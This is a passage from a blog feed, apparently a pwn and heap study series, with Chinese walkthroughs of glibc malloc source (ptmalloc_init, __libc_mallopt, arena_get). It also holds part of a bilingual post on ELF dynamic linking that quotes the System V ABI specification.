<p>回到<code>mmap_region</code>中，最后通过<code>vma_set_page_prot</code>继续设置一些标志位，然后就返回分配到的虚拟内存的起始地址addr了，该返回值一直向上返回，然后退出系统调用，返回到glibc中。<br>到这里简单总结一下MMAP，其实质就是通过mmap在进程的内存管理结构中的红黑树中分配一块没有使用的虚拟内存。</p>
<p>下一章继续往下分析glibc中的<code>_int_malloc</code>函数。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;malloc源码分析—-int-malloc&quot;&gt;&lt;a href=&quot;#malloc源码分析—-int-malloc&quot; class=&quot;headerlink&quot; title=&quot;malloc源码分析—_int_malloc&quot;&gt;&lt;/a&gt;malloc源码分析—_int_mall
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
      <category term="heap" scheme="http://yoursite.com/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>malloc源码分析——1</title>
    <link href="http://yoursite.com/2018/05/21/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%941/"/>
    <id>http://yoursite.com/2018/05/21/malloc源码分析——1/</id>
    <published>2018-05-21T06:35:24.000Z</published>
    <updated>2018-05-21T06:48:20.706Z</updated>
    
    <content type="html"><![CDATA[<h1 id="malloc源码分析—ptmalloc-init"><a href="#malloc源码分析—ptmalloc-init" class="headerlink" title="malloc源码分析—ptmalloc_init"></a>malloc源码分析—<code>ptmalloc_init</code></h1><p>本文分析malloc的源码，首先从glibc开始，首先看malloc.c文件中的一段定义，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strong_alias (__libc_malloc, __malloc) strong_alias (__libc_malloc, malloc)</div></pre></td></tr></table></figure>
<p><code>strong_alias</code>是GNU C中的定义，编译器判定这里malloc是<code>__libc_malloc</code>的别名，<code>__libc_malloc</code>定义在malloc.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">void * __libc_malloc (size_t bytes)&#123;</div><div class="line"></div><div class="line">    mstate ar_ptr;</div><div class="line">    void *victim;</div><div class="line"></div><div class="line">    void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook);</div><div class="line">    if (__builtin_expect (hook != NULL, 0))</div><div class="line">        return (*hook)(bytes, RETURN_ADDRESS (0));</div><div class="line"></div><div class="line">    arena_get (ar_ptr, bytes);</div><div class="line"></div><div class="line">    victim = _int_malloc (ar_ptr, bytes);</div><div class="line">    if (!victim &amp;&amp; ar_ptr != NULL)&#123;</div><div class="line">        LIBC_PROBE (memory_malloc_retry, 1, bytes);</div><div class="line">        ar_ptr = arena_get_retry (ar_ptr, bytes);</div><div class="line">        victim = _int_malloc (ar_ptr, bytes);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (ar_ptr != NULL)</div><div class="line">        (void) mutex_unlock (&amp;ar_ptr-&gt;mutex);</div><div class="line"></div><div class="line">    return victim;</div><div class="line">&#125;</div><div class="line">libc_hidden_def (__libc_malloc)</div></pre></td></tr></table></figure>
<p>首先看<code>atomic_forced_read</code>，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># define atomic_forced_read(x) \</div><div class="line">  (&#123; __typeof (x) __x; __asm (&quot;&quot; : &quot;=r&quot; (__x) : &quot;0&quot; (x)); __x; &#125;)</div></pre></td></tr></table></figure>
<p><code>__typeof</code>是原始函数的返回类型，后面是一段汇编代码，”0”是零，即%0，引用时不可以加 %，只能input引用output，这里就是原子读，将<code>__malloc_hook</code>的地址放入任意寄存器(r)再取出。<code>__malloc_hook</code>的定义如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">void *weak_variable (*__malloc_hook)(size_t __size, const void *) = malloc_hook_ini;</div></pre></td></tr></table></figure>
<p>weak_variable其实就是，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">__attribute__ ((weak))</div></pre></td></tr></table></figure>
<p>和编译器有关，这里不管它。<code>__builtin_expect</code>其实就是告诉编译器if判断语句里大多数情况下的值，这样编译器可以做优化，避免过多的跳转。回到<code>__libc_malloc</code>接下来就是调用<code>malloc_hook_ini</code>进行内存的分配。<br><code>malloc_hook_ini</code>定义在hooks.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">static void * malloc_hook_ini (size_t sz, const void *caller)&#123;</div><div class="line">    __malloc_hook = NULL;</div><div class="line">    ptmalloc_init ();</div><div class="line">    return __libc_malloc (sz);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="ptmalloc-init"><a href="#ptmalloc-init" class="headerlink" title="ptmalloc_init"></a>ptmalloc_init</h2><p>ptmalloc_init用来对整个ptmalloc框架进行初始化，定义在arena.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line">static void ptmalloc_init(void) &#123;</div><div class="line"></div><div class="line">    if (__malloc_initialized &gt;= 0)</div><div class="line">        return;</div><div class="line">    __malloc_initialized = 0;</div><div class="line"></div><div class="line">    tsd_key_create(&amp;arena_key, NULL);</div><div class="line">    tsd_setspecific(arena_key, (void *) &amp;main_arena);</div><div class="line">    thread_atfork(ptmalloc_lock_all, ptmalloc_unlock_all, ptmalloc_unlock_all2);</div><div class="line">    const char *s = NULL;</div><div class="line">    if (__glibc_likely(_environ != NULL)) &#123;</div><div class="line">        char **runp = _environ;</div><div class="line">        char *envline;</div><div class="line"></div><div class="line">        while (__builtin_expect((envline = next_env_entry(&amp;runp)) != NULL, 0)) &#123;</div><div class="line">            size_t len = strcspn(envline, &quot;=&quot;);</div><div class="line"></div><div class="line">            if (envline[len] != &apos;=&apos;)</div><div class="line">                continue;</div><div class="line"></div><div class="line">            switch (len) &#123;</div><div class="line">            case 6:</div><div class="line">                if (memcmp(envline, &quot;CHECK_&quot;, 6) == 0)</div><div class="line">                    s = &amp;envline[7];</div><div class="line">                break;</div><div class="line">            case 8:</div><div class="line">                if (!__builtin_expect(__libc_enable_secure, 0)) &#123;</div><div class="line">                    if (memcmp(envline, &quot;TOP_PAD_&quot;, 8) == 0)</div><div class="line">                        __libc_mallopt(M_TOP_PAD, atoi(&amp;envline[9]));</div><div class="line">                    else if (memcmp(envline, &quot;PERTURB_&quot;, 8) == 0)</div><div class="line">                        __libc_mallopt(M_PERTURB, atoi(&amp;envline[9]));</div><div class="line">                &#125;</div><div class="line">                break;</div><div class="line">            case 9:</div><div class="line">                if (!__builtin_expect(__libc_enable_secure, 0)) &#123;</div><div class="line">                    if (memcmp(envline, &quot;MMAP_MAX_&quot;, 9) == 0)</div><div class="line">                        __libc_mallopt(M_MMAP_MAX, atoi(&amp;envline[10]));</div><div class="line">                    else if (memcmp(envline, &quot;ARENA_MAX&quot;, 9) == 0)</div><div class="line">                        __libc_mallopt(M_ARENA_MAX, atoi(&amp;envline[10]));</div><div class="line">                &#125;</div><div class="line">                break;</div><div class="line">            case 10:</div><div class="line">                if (!__builtin_expect(__libc_enable_secure, 0)) &#123;</div><div class="line">                    if (memcmp(envline, &quot;ARENA_TEST&quot;, 10) == 0)</div><div class="line">                        __libc_mallopt(M_ARENA_TEST, atoi(&amp;envline[11]));</div><div class="line">                &#125;</div><div class="line">                break;</div><div class="line">            case 15:</div><div class="line">                if (!__builtin_expect(__libc_enable_secure, 0)) &#123;</div><div class="line">                    if (memcmp(envline, &quot;TRIM_THRESHOLD_&quot;, 15) == 0)</div><div class="line">                        __libc_mallopt(M_TRIM_THRESHOLD, atoi(&amp;envline[16]));</div><div class="line">                    else if (memcmp(envline, &quot;MMAP_THRESHOLD_&quot;, 15) == 0)</div><div class="line">                        __libc_mallopt(M_MMAP_THRESHOLD, atoi(&amp;envline[16]));</div><div class="line">                &#125;</div><div class="line">                break;</div><div class="line">            default:</div><div class="line">                break;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    if (s &amp;&amp; s[0]) &#123;</div><div class="line">        __libc_mallopt(M_CHECK_ACTION, (int) (s[0] - &apos;0&apos;));</div><div class="line">        if (check_action != 0)</div><div class="line">            __malloc_check_init();</div><div class="line">    &#125;</div><div class="line">    void (*hook)(void) = atomic_forced_read (__malloc_initialize_hook);</div><div class="line">    if (hook != NULL)</div><div class="line">        (*hook)();</div><div class="line">    __malloc_initialized = 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先检查全局变量<code>__malloc_initialized</code>是否大于等于0，如果该值大于0，表示ptmalloc已经初始化，如果改值为0，表示ptmalloc正在初始化，全局变量<code>__malloc_initialized</code>用来保证全局只初始化ptmalloc一次。<br><code>tsd_key_create</code>创建线程私有实例<code>arena_key</code>，该私有实例保存的是分配区（arena）的<code>malloc_state</code>实例指针。<code>arena_key</code>指向的可能是主分配区的指针，也可能是非主分配区的指针，这里将调用<code>ptmalloc_init()</code>的线程的<code>arena_key</code>绑定到主分配区上。意味着本线程首选从主分配区分配内存。arena_key在glibc中是一个线程私有变量，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#define tsd_key_create(key, destr)  ((void) (key))</div><div class="line">#define tsd_setspecific(key, data)  __libc_tsd_set (void *, MALLOC, (data))</div><div class="line">#define __libc_tsd_set(TYPE, KEY, VALUE)    (__libc_tsd_##KEY = (VALUE))</div></pre></td></tr></table></figure>
<p><code>tsd_setspecific(arena_key, (void *) &amp;main_arena);</code>就是<code>__libc_tsd_MALLOC = &amp;main_arena</code><br>thread_atfork用来设置进程在fork创建子进程时关于锁设置的各个函数，<code>ptmalloc_lock_all</code>和<code>ptmalloc_unlock_all</code>用来给父进程加锁解锁，<code>ptmalloc_unlock_all2</code>用来给子进程调用以解锁。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"># define thread_atfork(prepare, parent, child) \</div><div class="line">  atfork_mem.prepare_handler = prepare;                       \</div><div class="line">  atfork_mem.parent_handler = parent;                         \</div><div class="line">  atfork_mem.child_handler = child;                       \</div><div class="line">  atfork_mem.dso_handle = &amp;__dso_handle == NULL ? NULL : __dso_handle;        \</div><div class="line">  atfork_mem.refcntr = 1;                             \</div><div class="line">  __linkin_atfork (&amp;atfork_mem)</div></pre></td></tr></table></figure>
<p>其中，<code>atfork_mem</code>是一个全局的fork时的函数子针结构体fork_handler，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define ATFORK_MEM static struct fork_handler atfork_mem1</div></pre></td></tr></table></figure>
<p><code>__linkin_atfork</code>用于将刚刚构造的fork_handler添加进全局链表<code>__fork_handlers</code>中而不用加锁，其实就是一个CAS锁，关于该锁，可以查阅网上资料，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">void attribute_hidden __linkin_atfork(struct fork_handler *newp) &#123;</div><div class="line">    do</div><div class="line">        newp-&gt;next = __fork_handlers;</div><div class="line">    while (catomic_compare_and_exchange_bool_acq(&amp;__fork_handlers, newp,</div><div class="line">            newp-&gt;next) != 0);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>catomic_compare_and_exchange_bool_acq</code>最后是一个宏定义，将之改写后如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    fork_handler* __atg4_old = newp-&gt;next;</div><div class="line">    long __gmemp = &amp;__fork_handlers;</div><div class="line">    ATOMIC();</div><div class="line">    fork_handler* __gret = *__gmemp;</div><div class="line">    fork_handler* __gnewval = newp;</div><div class="line">    if (__gret == __atg4_old)</div><div class="line">       *__gmemp = newp;</div><div class="line">    ENDATOMIC();</div><div class="line">    __gret;</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
<p>gcc会将这段代码进行编译，生成的代码无法被中断。因此简单说来，<code>__linkin_atfork</code>就是将<code>fork_handler</code>原子添加进全局链表<code>__fork_handlers</code>中。</p>
<p>回到ptmalloc_init函数中，接下来就是进行环境变量的设置，<code>__glibc_likely</code>和gcc的编译优化相关，不管他。<code>_environ</code>就是<code>__environ</code>，里面保存了环境变量，下面就是根据各个环境变量调用<code>__libc_mallopt</code>进行设置，后面来看这个函数。</p>
<p><code>ptmalloc_init</code>然后获取<code>__malloc_initialize_hook</code>函数指针并执行，由于该函数和malloc没有直接关系，这里不管它。最后将<code>__malloc_initialized</code>设置为1，表是初始化完成。</p>
<h2 id="libc-mallopt"><a href="#libc-mallopt" class="headerlink" title="__libc_mallopt"></a>__libc_mallopt</h2><p><code>__libc_mallopt</code>定义在malloc.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div></pre></td><td class="code"><pre><div class="line">int __libc_mallopt(int param_number, int value) &#123;</div><div class="line">    mstate av = &amp;main_arena;</div><div class="line">    int res = 1;</div><div class="line"></div><div class="line">    if (__malloc_initialized &lt; 0)</div><div class="line">        ptmalloc_init();</div><div class="line">    (void) mutex_lock(&amp;av-&gt;mutex);</div><div class="line">    malloc_consolidate(av);</div><div class="line"></div><div class="line">    LIBC_PROBE (memory_mallopt, 2, param_number, value);</div><div class="line"></div><div class="line">    switch (param_number) &#123;</div><div class="line">    case M_MXFAST:</div><div class="line">        if (value &gt;= 0 &amp;&amp; value &lt;= MAX_FAST_SIZE) &#123;</div><div class="line">            LIBC_PROBE (memory_mallopt_mxfast, 2, value, get_max_fast ());</div><div class="line">            set_max_fast(value);</div><div class="line">        &#125; else</div><div class="line">            res = 0;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_TRIM_THRESHOLD:</div><div class="line">        LIBC_PROBE (memory_mallopt_trim_threshold, 3, value,</div><div class="line">                mp_.trim_threshold, mp_.no_dyn_threshold);</div><div class="line">        mp_.trim_threshold = value;</div><div class="line">        mp_.no_dyn_threshold = 1;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_TOP_PAD:</div><div class="line">        LIBC_PROBE (memory_mallopt_top_pad, 3, value,</div><div class="line">                mp_.top_pad, mp_.no_dyn_threshold);</div><div class="line">        mp_.top_pad = value;</div><div class="line">        mp_.no_dyn_threshold = 1;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_MMAP_THRESHOLD:</div><div class="line">        if ((unsigned long) value &gt; HEAP_MAX_SIZE / 2)</div><div class="line">            res = 0;</div><div class="line">        else &#123;</div><div class="line">            LIBC_PROBE (memory_mallopt_mmap_threshold, 3, value,</div><div class="line">                    mp_.mmap_threshold, mp_.no_dyn_threshold);</div><div class="line">            mp_.mmap_threshold = value;</div><div class="line">            mp_.no_dyn_threshold = 1;</div><div class="line">        &#125;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_MMAP_MAX:</div><div class="line">        LIBC_PROBE (memory_mallopt_mmap_max, 3, value,</div><div class="line">                mp_.n_mmaps_max, mp_.no_dyn_threshold);</div><div class="line">        mp_.n_mmaps_max = value;</div><div class="line">        mp_.no_dyn_threshold = 1;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_CHECK_ACTION:</div><div class="line">        LIBC_PROBE (memory_mallopt_check_action, 2, value, check_action);</div><div class="line">        check_action = value;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_PERTURB:</div><div class="line">        LIBC_PROBE (memory_mallopt_perturb, 2, value, perturb_byte);</div><div class="line">        perturb_byte = value;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_ARENA_TEST:</div><div class="line">        if (value &gt; 0) &#123;</div><div class="line">            LIBC_PROBE (memory_mallopt_arena_test, 2, value, mp_.arena_test);</div><div class="line">            mp_.arena_test = value;</div><div class="line">        &#125;</div><div class="line">        break;</div><div class="line"></div><div class="line">    case M_ARENA_MAX:</div><div class="line">        if (value &gt; 0) &#123;</div><div class="line">            LIBC_PROBE (memory_mallopt_arena_max, 2, value, mp_.arena_max);</div><div class="line">            mp_.arena_max = value;</div><div class="line">        &#125;</div><div class="line">        break;</div><div class="line">    &#125;</div><div class="line">    (void) mutex_unlock(&amp;av-&gt;mutex);</div><div class="line">    return res;</div><div class="line">&#125;</div><div class="line">libc_hidden_def( __libc_mallopt)</div></pre></td></tr></table></figure>
<p>首先通过<code>__malloc_initialized</code>判断如果ptmalloc还未初始化，就调用<code>ptmalloc_init</code>进行初始化。<code>malloc_consolidate</code>用来将fast bins中的chunk合并，并且里面会初始化主分配区，后面的章节会分析到这个函数。然后就根据传入的<code>param_number</code>设置<code>mp_</code>，<code>mp_</code>代表ptmalloc的各个全局参数，其默认定义如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">static struct malloc_par mp_ = &#123; </div><div class="line">    .top_pad = DEFAULT_TOP_PAD, </div><div class="line">    .n_mmaps_max = DEFAULT_MMAP_MAX, </div><div class="line">    .mmap_threshold = DEFAULT_MMAP_THRESHOLD, </div><div class="line">    .trim_threshold = DEFAULT_TRIM_THRESHOLD,</div><div class="line">#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</div><div class="line">    .arena_test = NARENAS_FROM_NCORES(1) </div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>这里不分析里面各个参数的意义，到后面用到时再来分析。<code>malloc_hook_ini</code>最后会回调<code>__libc_malloc</code>函数，这次<code>__malloc_hook</code>为null，因此继续看下面的代码。</p>
<h2 id="arena-get"><a href="#arena-get" class="headerlink" title="arena_get"></a>arena_get</h2><p>接下来通过<code>arena_get</code>获得一个分配区，<code>arena_get</code>是个宏定义，定义在arena.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#define arena_get(ptr, size) do &#123; \</div><div class="line">      arena_lookup (ptr);                             \</div><div class="line">      arena_lock (ptr, size);                             \</div><div class="line">  &#125; while (0)</div></pre></td></tr></table></figure>
<p><code>arena_lookup</code>从私有变量里获取分配区指针，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#define arena_lookup(ptr) do &#123; \</div><div class="line">      void *vptr = NULL;                              \</div><div class="line">      ptr = (mstate) tsd_getspecific (arena_key, vptr);               \</div><div class="line">  &#125; while (0)</div></pre></td></tr></table></figure>
<p><code>tsd_getspecific</code>也是个宏定义，就是获取前面调用<code>tsd_setspecific</code>设置的分配区指针，这里取出的可能是主分配去指针，也可能是非主分配去指针，然后调用<code>arena_lock</code>对<code>malloc_state</code>中的<code>mutex</code>加锁。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#define arena_lock(ptr, size) do &#123;                        \</div><div class="line">      if (ptr &amp;&amp; !arena_is_corrupt (ptr))                     \</div><div class="line">        (void) mutex_lock (&amp;ptr-&gt;mutex);                      \</div><div class="line">      else                                    \</div><div class="line">        ptr = arena_get2 (ptr, (size), NULL);                     \</div><div class="line">  &#125; while (0)</div></pre></td></tr></table></figure>
<p>获得分配去的指针后，就会调用<code>_int_malloc</code>开始分配内存了，下一章分析这个函数。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;malloc源码分析—ptmalloc-init&quot;&gt;&lt;a href=&quot;#malloc源码分析—ptmalloc-init&quot; class=&quot;headerlink&quot; title=&quot;malloc源码分析—ptmalloc_init&quot;&gt;&lt;/a&gt;malloc源码分析—&lt;co
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
      <category term="heap" scheme="http://yoursite.com/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Dynamic Linking</title>
    <link href="http://yoursite.com/2018/04/20/Dynamic-Linking/"/>
    <id>http://yoursite.com/2018/04/20/Dynamic-Linking/</id>
    <published>2018-04-20T14:26:26.000Z</published>
    <updated>2018-04-20T16:54:56.595Z</updated>
    
    <content type="html"><![CDATA[<h3 id="本文参考"><a href="#本文参考" class="headerlink" title="本文参考"></a>本文参考</h3><p><a href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html" target="_blank" rel="external">http://www.sco.com/developers/gabi/latest/ch5.dynamic.html</a></p>
<h3 id="程序解释器（Program-Interpreter）"><a href="#程序解释器（Program-Interpreter）" class="headerlink" title="程序解释器（Program Interpreter）"></a>程序解释器（Program Interpreter）</h3><p>可执行程序在动态链接的过程中会有 <code>PT_INTERP</code> 程序段。exec(BA_OS)过程中，系统通过<code>PT_INTERP</code>获取路径名并且创建最初的解释器解释的文件段镜像。这就是说，程序不使用可执行文件原始的段镜像，而是另外创建一块内存给解释器。然后，解释器获得程序的控制权并提供相应的运行环境。</p>
<p>解释器获得控制权有两种方式：</p>
<ol>
<li>利用文件描述符去读取或者映射可执行文件的段到内存中。</li>
<li>系统依赖可执行文件的格式，加载可执行文件到内存</li>
</ol>
<p>由于文件描述符可能存在异常，因此解释器的初始进程状态需要与可执行文件接收的内容相匹配。 解释器可以不需要另外的解释器来解释，也即可以自解释；解释器可以是共享对象或可执行文件。</p>
<ul>
<li>共享对象：正常情况下是位置独立加载的，地址可能因进程而异; 系统会在mmap(KE_OS)和相关服务使用的动态段区域中创建段。因此，共享对象解释器通常不会与原始可执行文件的原始段地址冲突。</li>
<li>可执行文件：可能加载在固定地址处; 如果是这样，系统将使用程序头表中的虚拟地址创建其段。 因此，可执行文件解释器的虚拟地址可能与第一个可执行文件发生冲突; 解释器需要负责解决冲突。</li>
</ul>
<h3 id="动态链接器（Dynamic-Linker）"><a href="#动态链接器（Dynamic-Linker）" class="headerlink" title="动态链接器（Dynamic Linker）"></a>动态链接器（Dynamic Linker）</h3><p>当动态链接编译可执行文件，链接器将会在程序头加入<code>PT_INTERP</code>，以告诉系统用动态链接器作为程序解释器。</p>
<p><em>提供动态连接器的系统位置是特定于处理器的。</em></p>
<p>exec(BA_OS)和动态链接共同创建了程序的过程映像，过程如下：</p>
<ul>
<li>将可执行文件的内存段加入过程映像</li>
<li>将共享对象的内存段加入过程映像</li>
<li>对可执行文件及其共享对象执行重定向</li>
<li>如果文件描述符被交给动态链接器，就关闭用于读取可执行文件的文件描述符</li>
</ul>
<h3 id="Program-Interpreter"><a href="#Program-Interpreter" class="headerlink" title="Program Interpreter"></a>Program Interpreter</h3><p>An executable file that participates in dynamic linking shall have one <code>PT_INTERP</code> program header element. During <code>exec</code>(BA_OS), the system retrieves a path name from the <code>PT_INTERP</code> segment and creates the initial process image from the interpreter file&#39;s segments. That is, instead of using the original executable file&#39;s segment images, the system composes a memory image for the interpreter. It then is the interpreter&#39;s responsibility to receive control from the system and provide an environment for the application program.</p>
<p>As &#39;&#39;Process Initialization&#39;&#39; in Chapter 3 of the processor supplement mentions, the interpreter receives control in one of two ways. First, it may receive a file descriptor to read the executable file, positioned at the beginning. It can use this file descriptor to read and/or map the executable file&#39;s segments into memory. Second, depending on the executable file format, the system may load the executable file into memory instead of giving the interpreter an open file descriptor. With the possible exception of the file descriptor, the interpreter&#39;s initial process state matches what the executable file would have received. The interpreter itself may not require a second interpreter. An interpreter may be either a shared object or an executable file.</p>
<ul>
<li>A shared object (the normal case) is loaded as position-independent, with addresses that may vary from one process to another; the system creates its segments in the dynamic segment area used by mmap(KE_OS) and related services [See <code></code>Virtual Address Space&#39;&#39; in Chapter 3 of the processor supplement]. Consequently, a shared object interpreter typically will not conflict with the original executable file&#39;s original segment addresses.</li>
<li>An executable file may be loaded at fixed addresses; if so, the system creates its segments using the virtual addresses from the program header table. Consequently, an executable file interpreter&#39;s virtual addresses may collide with the first executable file; the interpreter is responsible for resolving conflicts.</li>
</ul>
<h3 id="Dynamic-Linker"><a href="#Dynamic-Linker" class="headerlink" title="Dynamic Linker"></a>Dynamic Linker</h3><p>When building an executable file that uses dynamic linking, the link editor adds a program header element of type <code>PT_INTERP</code>  to an executable file, telling the system to invoke the dynamic linker as the program interpreter.</p>
<hr>
<p> The locations of the system provided dynamic linkers are processor specific.</p>
<hr>
<p><code>Exec</code>(BA_OS) and the dynamic linker cooperate to create the process image for the program, which entails the following actions:</p>
<ul>
<li>Adding the executable file&#39;s memory segments to the process image;</li>
<li>Adding shared object memory segments to the process image;</li>
<li>Performing relocations for the executable file and its shared objects;</li>
<li>Closing the file descriptor that was used to read the executable file, if one was given to the dynamic linker;</li>
<li>Transferring control to the program, making it look as if the program had received control directly from<code>exec</code>(BA_OS).</li>
</ul>
<p>The link editor also constructs various data that assist the dynamic linker for executable and shared object files. As shown above in <a href="http://www.sco.com/developers/gabi/latest/ch5.pheader.html" target="_blank" rel="external">&#39;&#39;&#39;Program Header&#39;&#39;</a>, this data resides in loadable segments, making them available during execution. (Once again, recall the exact segment contents are processor-specific. See the processor supplement for complete information).</p>
<ul>
<li>A <code>.dynamic</code>section with type <code>SHT_DYNAMIC</code>holds various data. The structure residing at the beginning of the section holds the addresses of other dynamic linking information.</li>
<li>The <code>.hash</code>section with type <code>SHT_HASH</code>holds a symbol hash table.</li>
<li>The <code>.got</code> and <code>.plt</code> sections with type <code>SHT_PROGBITS</code> hold two separate tables: the global offset table and the procedure linkage table. Chapter 3 discusses how programs use the global offset table for position-independent code. Sections below explain how the dynamic linker uses and changes the tables to create memory images for object files.</li>
</ul>
<p>Because every ABI-conforming program imports the basic system services from a shared object library [See &#39;&#39;System Library&#39;&#39; in Chapter 6], the dynamic linker participates in every ABI-conforming program execution.</p>
